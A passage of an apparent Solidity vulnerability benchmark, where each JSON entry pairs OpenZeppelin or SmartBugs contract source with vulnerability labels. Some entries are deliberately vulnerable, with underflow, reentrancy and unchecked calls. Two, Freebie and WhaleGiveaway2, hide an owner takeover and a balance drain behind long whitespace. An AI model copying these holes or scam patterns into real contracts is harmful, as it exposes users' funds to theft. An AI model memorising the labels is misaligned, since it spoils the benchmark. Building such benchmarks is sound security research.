abi.encodePacked(request.data, request.from);\n\n            uint256 gasLeft;\n\n            assembly (\"memory-safe\") {\n                success := call(reqGas, to, value, add(data, 0x20), mload(data), 0x00, 0x00)\n                gasLeft := gas()\n            }\n\n            _checkForwardedGas(gasLeft, request);\n\n            emit ExecutedForwardRequest(signer, currentNonce, success);\n        }\n    }\n\n    /**\n     * @dev Returns whether the target trusts this forwarder.\n     *\n     * This function performs a static call to the target contract calling the\n     * {ERC2771Context-isTrustedForwarder} function.\n     *\n     * NOTE: Consider the execution of this forwarder is permissionless. Without this check, anyone may transfer assets\n     * that are owned by, or are approved to this forwarder.\n     */\n    function _isTrustedByTarget(address target) internal view virtual returns (bool) {\n        bytes memory encodedParams = abi.encodeCall(ERC2771Context.isTrustedForwarder, (address(this)));\n\n        bool success;\n        uint256 returnSize;\n        uint256 returnValue;\n        assembly (\"memory-safe\") {\n            // Perform the staticcall and save the result in the scratch space.\n            // | Location  | Content  | Content (Hex)                                                      |\n            // |-----------|----------|--------------------------------------------------------------------|\n            // |           |          |                                                           result \u2193 |\n            // | 0x00:0x1F | selector | 0x0000000000000000000000000000000000000000000000000000000000000001 |\n            success := staticcall(gas(), target, add(encodedParams, 0x20), mload(encodedParams), 0x00, 0x20)\n            returnSize := returndatasize()\n            returnValue := mload(0x00)\n        }\n\n        return success && returnSize >= 0x20 && returnValue > 0;\n    }\n\n    /**\n     * @dev Checks if the requested gas was correctly forwarded to the callee.\n     *\n     * As a consequence of https://eips.ethereum.org/EIPS/eip-150[EIP-150]:\n     * - At most `gasleft() - floor(gasleft() / 64)` is forwarded to the callee.\n     * - At least `floor(gasleft() / 64)` is kept in the caller.\n     *\n     * It reverts consuming all the available gas if the forwarded gas is not the requested gas.\n     *\n     * IMPORTANT: The `gasLeft` parameter should be measured exactly at the end of the forwarded call.\n     * Any gas consumed in between will make room for bypassing this check.\n     */\n    function _checkForwardedGas(uint256 gasLeft, ForwardRequestData calldata request) private pure {\n        // To avoid insufficient gas griefing attacks, as referenced in https://ronan.eth.limo/blog/ethereum-gas-dangers/\n        //\n        // A malicious relayer can attempt to shrink the gas forwarded so that the underlying call reverts out-of-gas\n        // but the forwarding itself still succeeds. In order to make sure that the subcall received sufficient gas,\n        // we will inspect gasleft() after the forwarding.\n        //\n        // Let X be the gas available before the subcall, such that the subcall gets at most X * 63 / 64.\n        // We can't know X after CALL dynamic costs, but we want it to be such that X * 63 / 64 >= req.gas.\n        // Let Y be the gas used in the subcall. gasleft() measured immediately after the subcall will be gasleft() = X - Y.\n        // If the subcall ran out of gas, then Y = X * 63 / 64 and gasleft() = X - Y = X / 64.\n        // Under this assumption req.gas / 63 > gasleft() is true if and only if\n        // req.gas / 63 > X / 64, or equivalently req.gas > X * 63 / 64.\n        // This means that if the subcall runs out of gas we are able to detect that insufficient gas was passed.\n        //\n        // We will now also see that req.gas / 63 > gasleft() implies that req.gas >= X * 63 / 64.\n        // The contract guarantees Y <= req.gas, thus gasleft() = X - Y >= X - req.gas.\n        // -    req.gas / 63 > gasleft()\n        // -    req.gas / 63 >= X - req.gas\n        // -    req.gas >= X * 63 / 64\n        // In other words if req.gas < X * 63 / 64 then req.gas / 63 <= gasleft(), thus if the relayer behaves honestly\n        // the forwarding does not revert.\n        if (gasLeft < request.gas / 63) {\n            // We explicitly trigger invalid opcode to consume all gas and bubble-up the effects, since\n            // neither revert or assert consume all gas since Solidity 0.8.20\n            // https://docs.soliditylang.org/en/v0.8.20/control-structures.html#panic-via-assert-and-error-via-require\n            assembly (\"memory-safe\") {\n                invalid()\n            }\n        }\n    }\n}\n",
    "num_lines": 373,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "SignerEIP7702",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/cryptography/signers/SignerEIP7702.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/cryptography/signers/SignerEIP7702.sol)\n\npragma solidity ^0.8.20;\n\nimport {AbstractSigner} from \"./AbstractSigner.sol\";\nimport {ECDSA} from \"../ECDSA.sol\";\n\n/**\n * @dev Implementation of {AbstractSigner} for implementation for an EOA. Useful for EIP-7702 accounts.\n *\n * @custom:stateless\n */\nabstract contract SignerEIP7702 is AbstractSigner {\n    /**\n     * @dev Validates the signature using the EOA's address (i.e. `address(this)`).\n     */\n    function _rawSignatureValidation(\n        bytes32 hash,\n        bytes calldata signature\n    ) internal view virtual override returns (bool) {\n        (address recovered, ECDSA.RecoverError err, ) = ECDSA.tryRecoverCalldata(hash, signature);\n        return address(this) == recovered && err == ECDSA.RecoverError.NoError;\n    }\n}\n",
    "num_lines": 26,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "ERC1155Holder",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC1155/utils/ERC1155Holder.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC165, ERC165} from \"../../../utils/introspection/ERC165.sol\";\nimport {IERC1155Receiver} from \"../IERC1155Receiver.sol\";\n\n/**\n * @dev Simple implementation of `IERC1155Receiver` that will allow a contract to hold ERC-1155 tokens.\n *\n * IMPORTANT: When inheriting this contract, you must include a way to use the received tokens, otherwise they will be\n * stuck.\n *\n * @custom:stateless\n */\nabstract contract ERC1155Holder is ERC165, IERC1155Receiver {\n    /// @inheritdoc IERC165\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n        return interfaceId == type(IERC1155Receiver).interfaceId || super.supportsInterface(interfaceId);\n    }\n\n    function onERC1155Received(\n        address,\n        address,\n        uint256,\n        uint256,\n        bytes memory\n    ) public virtual override returns (bytes4) {\n        return this.onERC1155Received.selector;\n    }\n\n    function onERC1155BatchReceived(\n        address,\n        address,\n        uint256[] memory,\n        uint256[] memory,\n        bytes memory\n    ) public virtual override returns (bytes4) {\n        return this.onERC1155BatchReceived.selector;\n    }\n}\n",
    "num_lines": 43,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "AbstractSigner",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/cryptography/signers/AbstractSigner.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/cryptography/signers/AbstractSigner.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Abstract contract for signature validation.\n *\n * Developers must implement {_rawSignatureValidation} and use it as the lowest-level signature validation mechanism.\n *\n * @custom:stateless\n */\nabstract contract AbstractSigner {\n    /**\n     * @dev Signature validation algorithm.\n     *\n     * WARNING: Implementing a signature validation algorithm is a security-sensitive operation as it involves\n     * cryptographic verification. It is important to review and test thoroughly before deployment. Consider\n     * using one of the signature verification libraries (xref:api:utils/cryptography#ECDSA[ECDSA],\n     * xref:api:utils/cryptography#P256[P256] or xref:api:utils/cryptography#RSA[RSA]).\n     */\n    function _rawSignatureValidation(bytes32 hash, bytes calldata signature) internal view virtual returns (bool);\n}\n",
    "num_lines": 24,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "token",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/token.sol",
    "contract_code": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Steve Marx\n * @vulnerable_at_lines: 20,22\n */\n\n pragma solidity ^0.4.18;\n\n contract Token {\n\n   mapping(address => uint) balances;\n   uint public totalSupply;\n\n   function Token(uint _initialSupply) {\n     balances[msg.sender] = totalSupply = _initialSupply;\n   }\n\n   function transfer(address _to, uint _value) public returns (bool) {\n     // <yes> <report> ARITHMETIC\n     require(balances[msg.sender] - _value >= 0);\n     // <yes> <report> ARITHMETIC\n     balances[msg.sender] -= _value;\n     balances[_to] += _value;\n     return true;\n   }\n\n   function balanceOf(address _owner) public constant returns (uint balance) {\n     return balances[_owner];\n   }\n }\n",
    "num_lines": 31,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract PERSONAL_BANK\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum = 1 ether;\n    \n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)revert();\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)revert();\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 96,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 39\n */\n\npragma solidity ^0.4.19;\n\ncontract Freebie\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 41,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 63\n */\n\npragma solidity ^0.4.19;\n\ncontract PENNY_BY_PENNY  \n{\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n    \n    mapping (address => Holder) public Acc;\n    \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Put(uint _lockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n    \n}\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 104,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}\n",
    "num_lines": 47,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "SafeERC20",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC20/utils/SafeERC20.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"../IERC20.sol\";\nimport {IERC1363} from \"../../../interfaces/IERC1363.sol\";\n\n/**\n * @title SafeERC20\n * @dev Wrappers around ERC-20 operations that throw on failure (when the token\n * contract returns false). Tokens that return no value (and instead revert or\n * throw on failure) are also supported, non-reverting calls are assumed to be\n * successful.\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\n */\nlibrary SafeERC20 {\n    /**\n     * @dev An operation with an ERC-20 token failed.\n     */\n    error SafeERC20FailedOperation(address token);\n\n    /**\n     * @dev Indicates a failed `decreaseAllowance` request.\n     */\n    error SafeERC20FailedDecreaseAllowance(address spender, uint256 currentAllowance, uint256 requestedDecrease);\n\n    /**\n     * @dev Transfer `value` amount of `token` from the calling contract to `to`. If `token` returns no value,\n     * non-reverting calls are assumed to be successful.\n     */\n    function safeTransfer(IERC20 token, address to, uint256 value) internal {\n        if (!_safeTransfer(token, to, value, true)) {\n            revert SafeERC20FailedOperation(address(token));\n        }\n    }\n\n    /**\n     * @dev Transfer `value` amount of `token` from `from` to `to`, spending the approval given by `from` to the\n     * calling contract. If `token` returns no value, non-reverting calls are assumed to be successful.\n     */\n    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\n        if (!_safeTransferFrom(token, from, to, value, true)) {\n            revert SafeERC20FailedOperation(address(token));\n        }\n    }\n\n    /**\n     * @dev Variant of {safeTransfer} that returns a bool instead of reverting if the operation is not successful.\n     */\n    function trySafeTransfer(IERC20 token, address to, uint256 value) internal returns (bool) {\n        return _safeTransfer(token, to, value, false);\n    }\n\n    /**\n     * @dev Variant of {safeTransferFrom} that returns a bool instead of reverting if the operation is not successful.\n     */\n    function trySafeTransferFrom(IERC20 token, address from, address to, uint256 value) internal returns (bool) {\n        return _safeTransferFrom(token, from, to, value, false);\n    }\n\n    /**\n     * @dev Increase the calling contract's allowance toward `spender` by `value`. If `token` returns no value,\n     * non-reverting calls are assumed to be successful.\n     *\n     * IMPORTANT: If the token implements ERC-7674 (ERC-20 with temporary allowance), and if the \"client\"\n     * smart contract uses ERC-7674 to set temporary allowances, then the \"client\" smart contract should avoid using\n     * this function. Performing a {safeIncreaseAllowance} or {safeDecreaseAllowance} operation on a token contract\n     * that has a non-zero temporary allowance (for that particular owner-spender) will result in unexpected behavior.\n     */\n    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {\n        uint256 oldAllowance = token.allowance(address(this), spender);\n        forceApprove(token, spender, oldAllowance + value);\n    }\n\n    /**\n     * @dev Decrease the calling contract's allowance toward `spender` by `requestedDecrease`. If `token` returns no\n     * value, non-reverting calls are assumed to be successful.\n     *\n     * IMPORTANT: If the token implements ERC-7674 (ERC-20 with temporary allowance), and if the \"client\"\n     * smart contract uses ERC-7674 to set temporary allowances, then the \"client\" smart contract should avoid using\n     * this function. Performing a {safeIncreaseAllowance} or {safeDecreaseAllowance} operation on a token contract\n     * that has a non-zero temporary allowance (for that particular owner-spender) will result in unexpected behavior.\n     */\n    function safeDecreaseAllowance(IERC20 token, address spender, uint256 requestedDecrease) internal {\n        unchecked {\n            uint256 currentAllowance = token.allowance(address(this), spender);\n            if (currentAllowance < requestedDecrease) {\n                revert SafeERC20FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);\n            }\n            forceApprove(token, spender, currentAllowance - requestedDecrease);\n        }\n    }\n\n    /**\n     * @dev Set the calling contract's allowance toward `spender` to `value`. If `token` returns no value,\n     * non-reverting calls are assumed to be successful. Meant to be used with tokens that require the approval\n     * to be set to zero before setting it to a non-zero value, such as USDT.\n     *\n     * NOTE: If the token implements ERC-7674, this function will not modify any temporary allowance. This function\n     * only sets the \"standard\" allowance. Any temporary allowance will remain active, in addition to the value being\n     * set here.\n     */\n    function forceApprove(IERC20 token, address spender, uint256 value) internal {\n        if (!_safeApprove(token, spender, value, false)) {\n            if (!_safeApprove(token, spender, 0, true)) revert SafeERC20FailedOperation(address(token));\n            if (!_safeApprove(token, spender, value, true)) revert SafeERC20FailedOperation(address(token));\n        }\n    }\n\n    /**\n     * @dev Performs an {ERC1363} transferAndCall, with a fallback to the simple {ERC20} transfer if the target has no\n     * code. This can be used to implement an {ERC721}-like safe transfer that relies on {ERC1363} checks when\n     * targeting contracts.\n     *\n     * Reverts if the returned value is other than `true`.\n     */\n    function transferAndCallRelaxed(IERC1363 token, address to, uint256 value, bytes memory data) internal {\n        if (to.code.length == 0) {\n            safeTransfer(token, to, value);\n        } else if (!token.transferAndCall(to, value, data)) {\n            revert SafeERC20FailedOperation(address(token));\n        }\n    }\n\n    /**\n     * @dev Performs an {ERC1363} transferFromAndCall, with a fallback to the simple {ERC20} transferFrom if the target\n     * has no code. This can be used to implement an {ERC721}-like safe transfer that relies on {ERC1363} checks when\n     * targeting contracts.\n     *\n     * Reverts if the returned value is other than `true`.\n     */\n    function transferFromAndCallRelaxed(\n        IERC1363 token,\n        address from,\n        address to,\n        uint256 value,\n        bytes memory data\n    ) internal {\n        if (to.code.length == 0) {\n            safeTransferFrom(token, from, to, value);\n        } else if (!token.transferFromAndCall(from, to, value, data)) {\n            revert SafeERC20FailedOperation(address(token));\n        }\n    }\n\n    /**\n     * @dev Performs an {ERC1363} approveAndCall, with a fallback to the simple {ERC20} approve if the target has no\n     * code. This can be used to implement an {ERC721}-like safe transfer that rely on {ERC1363} checks when\n     * targeting contracts.\n     *\n     * NOTE: When the recipient address (`to`) has no code (i.e. is an EOA), this function behaves as {forceApprove}.\n     * Oppositely, when the recipient address (`to`) has code, this function only attempts to call {ERC1363-approveAndCall}\n     * once without retrying, and relies on the returned value to be true.\n     *\n     * Reverts if the returned value is other than `true`.\n     */\n    function approveAndCallRelaxed(IERC1363 token, address to, uint256 value, bytes memory data) internal {\n        if (to.code.length == 0) {\n            forceApprove(token, to, value);\n        } else if (!token.approveAndCall(to, value, data)) {\n            revert SafeERC20FailedOperation(address(token));\n        }\n    }\n\n    /**\n     * @dev Imitates a Solidity `token.transfer(to, value)` call, relaxing the requirement on the return value: the\n     * return value is optional (but if data is returned, it must not be false).\n     *\n     * @param token The token targeted by the call.\n     * @param to The recipient of the tokens\n     * @param value The amount of token to transfer\n     * @param bubble Behavior switch if the transfer call reverts: bubble the revert reason or return a false boolean.\n     */\n    function _safeTransfer(IERC20 token, address to, uint256 value, bool bubble) private returns (bool success) {\n        bytes4 selector = IERC20.transfer.selector;\n\n        assembly (\"memory-safe\") {\n            let fmp := mload(0x40)\n            mstore(0x00, selector)\n            mstore(0x04, and(to, shr(96, not(0))))\n            mstore(0x24, value)\n            success := call(gas(), token, 0, 0x00, 0x44, 0x00, 0x20)\n            // if call success and return is true, all is good.\n            // otherwise (not success or return is not true), we need to perform further checks\n            if iszero(and(success, eq(mload(0x00), 1))) {\n                // if the call was a failure and bubble is enabled, bubble the error\n                if and(iszero(success), bubble) {\n                    returndatacopy(fmp, 0x00, returndatasize())\n                    revert(fmp, returndatasize())\n                }\n                // if the return value is not true, then the call is only successful if:\n                // - the token address has code\n                // - the returndata is empty\n                success := and(success, and(iszero(returndatasize()), gt(extcodesize(token), 0)))\n            }\n            mstore(0x40, fmp)\n        }\n    }\n\n    /**\n     * @dev Imitates a Solidity `token.transferFrom(from, to, value)` call, relaxing the requirement on the return\n     * value: the return value is optional (but if data is returned, it must not be false).\n     *\n     * @param token The token targeted by the call.\n     * @param from The sender of the tokens\n     * @param to The recipient of the tokens\n     * @param value The amount of token to transfer\n     * @param bubble Behavior switch if the transfer call reverts: bubble the revert reason or return a false boolean.\n     */\n    function _safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value,\n        bool bubble\n    ) private returns (bool success) {\n        bytes4 selector = IERC20.transferFrom.selector;\n\n        assembly (\"memory-safe\") {\n            let fmp := mload(0x40)\n            mstore(0x00, selector)\n            mstore(0x04, and(from, shr(96, not(0))))\n            mstore(0x24, and(to, shr(96, not(0))))\n            mstore(0x44, value)\n            success := call(gas(), token, 0, 0x00, 0x64, 0x00, 0x20)\n            // if call success and return is true, all is good.\n            // otherwise (not success or return is not true), we need to perform further checks\n            if iszero(and(success, eq(mload(0x00), 1))) {\n                // if the call was a failure and bubble is enabled, bubble the error\n                if and(iszero(success), bubble) {\n                    returndatacopy(fmp, 0x00, returndatasize())\n                    revert(fmp, returndatasize())\n                }\n                // if the return value is not true, then the call is only successful if:\n                // - the token address has code\n                // - the returndata is empty\n                success := and(success, and(iszero(returndatasize()), gt(extcodesize(token), 0)))\n            }\n            mstore(0x40, fmp)\n            mstore(0x60, 0)\n        }\n    }\n\n    /**\n     * @dev Imitates a Solidity `token.approve(spender, value)` call, relaxing the requirement on the return value:\n     * the return value is optional (but if data is returned, it must not be false).\n     *\n     * @param token The token targeted by the call.\n     * @param spender The spender of the tokens\n     * @param value The amount of token to transfer\n     * @param bubble Behavior switch if the transfer call reverts: bubble the revert reason or return a false boolean.\n     */\n    function _safeApprove(IERC20 token, address spender, uint256 value, bool bubble) private returns (bool success) {\n        bytes4 selector = IERC20.approve.selector;\n\n        assembly (\"memory-safe\") {\n            let fmp := mload(0x40)\n            mstore(0x00, selector)\n            mstore(0x04, and(spender, shr(96, not(0))))\n            mstore(0x24, value)\n            success := call(gas(), token, 0, 0x00, 0x44, 0x00, 0x20)\n            // if call success and return is true, all is good.\n            // otherwise (not success or return is not true), we need to perform further checks\n            if iszero(and(success, eq(mload(0x00), 1))) {\n                // if the call was a failure and bubble is enabled, bubble the error\n                if and(iszero(success), bubble) {\n                    returndatacopy(fmp, 0x00, returndatasize())\n                    revert(fmp, returndatasize())\n                }\n                // if the return value is not true, then the call is only successful if:\n                // - the token address has code\n                // - the returndata is empty\n                success := and(success, and(iszero(returndatasize()), gt(extcodesize(token), 0)))\n            }\n            mstore(0x40, fmp)\n        }\n    }\n}\n",
    "num_lines": 281,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "integer_overflow_benign_1",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_benign_1.sol",
    "contract_code": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_benign_1.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow never escapes function\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowBenign1 {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        uint res = count - input;\n    }\n}\n",
    "num_lines": 20,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "unchecked_return_value",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/unchecked_return_value.sol",
    "contract_code": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-104#unchecked-return-valuesol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity 0.4.25;\n\ncontract ReturnValue {\n\n  function callchecked(address callee) public {\n    require(callee.call());\n  }\n\n  function callnotchecked(address callee) public {\n     // <yes> <report> UNCHECKED_LL_CALLS\n    callee.call();\n  }\n}\n",
    "num_lines": 20,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xa46edd6a9a93feec36576ee5048146870ea2c3ae",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.18;\n\ncontract EBU{\n    \n    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v[i]);\n        }\n        return true;\n    }\n}",
    "num_lines": 20,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "integer_overflow_mapping_sym_1",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_mapping_sym_1.sol",
